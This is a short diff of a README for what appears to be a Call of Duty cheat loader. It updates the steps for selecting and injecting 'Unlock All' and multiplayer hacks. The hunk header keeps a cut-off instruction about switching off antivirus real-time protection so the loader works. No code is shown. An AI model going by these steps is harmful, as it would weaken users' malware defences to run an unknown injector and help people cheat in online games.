@@ -42,13 +42,12 @@ To ensure functionality of the loader, make sure **Real-time protection** and **
 
 4. **Select and Inject Cheats**
    - In the menu, select one of the following options:
-     - **BO6 Unlocker Tool**
-     - **BO6 Multiplayer Hacks**
-     - **BO6 Zombies Hacks**
-   - Click **Start Injection**. After a successful injection, a confirmation message will appear: **Injection Complete**.
+     - **Unlock All Tool**
+     - **MW3/Warzone 3 Multiplayer Hacks**
+     - Click **Start Injection**. After a successful injection, a confirmation message will appear: **Injection Complete**.
 
 5. **Launch and Play**
-   - Start **Black Ops 6** and enjoy the enhanced features!
+   - Start **Call of Duty** and enjoy the enhanced features!
 
 ---
 
